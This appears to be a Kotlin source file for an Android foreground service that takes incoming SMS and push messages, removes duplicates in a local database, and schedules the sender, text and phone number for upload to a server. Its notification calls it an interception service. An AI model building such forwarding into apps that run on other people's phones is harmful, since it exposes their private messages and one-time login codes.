package com.example.parserapp.domain

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.parserapp.R
import com.example.parserapp.data.entities.ProcessedMessageEntity
import com.example.parserapp.data.repository.SmsRepository
import com.example.parserapp.di.AppDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.time.Clock
import java.util.Date
import java.util.Locale

class SmsService : Service() {

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val phoneNumber = intent?.getStringExtra("phoneNumber") ?: return START_NOT_STICKY
        val sender = intent.getStringExtra("sender") ?: return START_NOT_STICKY
        val message = intent.getStringExtra("message") ?: return START_NOT_STICKY
        val isSms = intent.getBooleanExtra("isSms", true)
        val timestampLog = SimpleDateFormat("dd.MM.yyyy HH:mm", Locale.getDefault()).format(Date())
        val timestamp = Clock.systemUTC().instant().toEpochMilli()

        val db = AppDatabase.getDatabase(this)
        val dao = db.processedMessageDao()

        CoroutineScope(Dispatchers.IO).launch {
            val isProcessed = dao.isMessageProcessed(sender, message, timestamp) > 0

            if (isProcessed) {
                Log.d("ParserSms", "⚠ Сообщение уже обработано (в интервале ±3 сек): $sender - $message")
            } else {
                dao.insertMessage(ProcessedMessageEntity(sender = sender, message = message, timestamp = timestamp))
                Log.d("ParserSms", "📩 Обрабатываем новое сообщение от: $sender")

                SmsRepository.scheduleSmsUpload(this@SmsService, phoneNumber, sender, message,
                    timestamp.toString(), timestampLog, isSms)
            }

            val expiryTime = System.currentTimeMillis() - (24 * 60 * 60 * 1000)
            dao.deleteOldMessages(expiryTime)
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(1, createNotification())
    }

    private fun createNotification(): Notification {
        val channel = NotificationChannel(
            "SMS_CHANNEL",
            "SMS Service",
            NotificationManager.IMPORTANCE_LOW
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)

        return NotificationCompat.Builder(this, "SMS_CHANNEL")
            .setContentTitle("Сервис перехвата активен")
            .setContentText("Обрабатываем входящие SMS/PUSH...")
            .setSmallIcon(R.drawable.refresh)
            .build()
    }

}